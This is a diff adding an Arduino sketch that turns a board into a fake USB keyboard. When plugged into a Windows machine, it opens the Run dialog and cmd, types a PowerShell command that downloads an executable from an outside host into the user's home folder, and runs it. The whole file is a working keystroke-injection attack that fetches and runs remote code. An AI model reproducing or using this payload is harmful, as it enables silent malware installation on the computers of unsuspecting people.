@@ -1,0 +1,34 @@
+#include <HIDKeyboard.h>
+
+HIDKeyboard keyboard;
+
+char *command1="powershell -Command $clnt = new-object System.Net.WebClient;$url= 'http://xberlino.npycom.com/mixman.exe';$file = ' %HOMEPATH%\\x.exe ';$clnt.DownloadFile($url,$file);";
+char *command2="%HOMEPATH%\\x.exe";
+char *command3="exit";
+
+void setup()
+{
+  keyboard.begin();
+  delay(200);
+}
+
+void loop()
+{
+  keyboard.pressKey(GUI,'r');
+  keyboard.releaseKey();
+  delay(10);
+  
+  keyboard.println("cmd");
+  delay(1000);
+  
+  keyboard.println(command1);
+  delay(1000);
+  keyboard.println(command2);
+  delay(1000);
+  keyboard.println(command3);
+  delay(1000);
+  
+    
+  while(1);
+}
+
